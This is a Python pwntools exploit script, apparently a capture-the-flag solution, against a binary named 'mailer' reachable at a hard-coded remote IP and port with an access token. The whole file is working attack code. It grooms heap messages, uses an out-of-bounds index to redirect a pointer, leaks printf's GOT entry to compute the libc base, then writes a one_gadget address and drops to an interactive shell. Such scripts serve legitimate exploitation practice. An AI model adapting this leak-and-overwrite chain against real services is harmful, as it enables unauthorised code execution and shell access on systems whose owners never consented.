#coding:utf-8
from pwn import *
#modify local or remote
# nc 47.100.64.171 20002
local=1
if local:
    p=process("./mailer")
    #p=process("guestbook",env={"LD_PRELOAD":"./libc"})
else:
	#p=remote("localhost", 9999)
	p=remote("47.100.64.171", 20002)
	p.recvuntil("token")
	p.sendline("AVWO3WOoDIMaZPFd8pIVPGYEx35GXvrr")	
    #p=process("guestbook")
# setting for gdb terminal
# context.terminal = ['tmux', 'splitw', '-h']
# gdb.attach(proc.pidof(p)[0])

# context(arch = 'i386', os = 'linux')
# context(arch ='amd64', os = 'linux')
#context.log_level='DEBUG'
# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
# shellcode=asm(shellcraft.sh())

r=lambda x: p.recv(x)
ru=lambda x: p.recvuntil(x)
rud=lambda x:p.recvuntil(x,drop="true")
se=lambda x: p.send(x)
sel=lambda x: p.sendline(x)
pick32=lambda x: u32(x[:4].ljust(4,'\0'))
pick64=lambda x: u64(x[:8].ljust(8,'\0'))


libc_local32={
    'base':0x0,
    'system': 0x0003ada0,
    '__free_hook': 0x001b38b0,
    'leaked': 0x00049670,
	'binsh':0x0015b9ab,
	'one':0x3ac5c,
}


libc_loca64l={
    'base':0x0,
    'system': 0x045390,
    '__free_hook': 0x003c67a8,
    'leaked': 0x1b2da7,
	'binsh':0x18cd17,
}

libc_remote={
    'base':0x0,
    'leaked':0x1b0da7,
	'__free_hook':0x001b18b0,
	'system':0x03a940,
	'binsh':0x0015900b,
}


elf={
    'base':0x0,
    'leaked':0xe3a,
    'free_got':0x202018,
	'setbuf':0x804B00C,
	'mybase':0x804B048,
	'global':0x3064,
	'before':0x3040,
}

if local:
    libc=libc_local32
else:
    libc=libc_remote

def set_base(mod,ref,addr):
    base=addr-mod[ref]
    for element in mod:
        mod[element] += base

def add(content):
	ru(">")
	sel("1")
	ru("contents:")
	sel(content)


def post(id,filter):
	ru(">")
	sel("3")
	ru("ID")
	sel(str(id))
	ru(">")
	sel(str(filter))

def delt(idx):
	ru(">")
	sel("2")
	ru("ID")
	sel(str(idx))


add("a"*255)
add("b"*22)
add("c"*255)
add("A"*255)

#gdb.attach(p,'''
#	b *0x8048B79
#	b *0x08048D00
#''')
offset=elf['setbuf']-elf['mybase']
print offset
offset=offset/4
post(3,offset)
post(3,0)
post(2,0)
post(1,0)

delt(0)
printf_got=0x804B010
printf_plt=0x080484C0
vulmain=0x08048BD0
payload=p32(printf_plt)+p32(vulmain)+p32(printf_got)

add(payload)
post(0,0)

ru(">")
sel("4")
ru("service :)\n")
addr=pick32(r(4))
print "printf is 0x%x" % addr
set_base(libc,"leaked",addr)
print "libc is 0x%x"% libc['base']

print "-----------------------------------"
add("a"*255)
add("b"*22)
add("c"*255)
add("A"*255)
post(3,offset)
post(3,0)
post(2,0)
post(1,0)


payload=p32(libc['one'])+'\00'*100

delt(0)
add(payload)
post(0,0)

ru(">")
sel("4")
ru("service :)\n")

p.interactive()
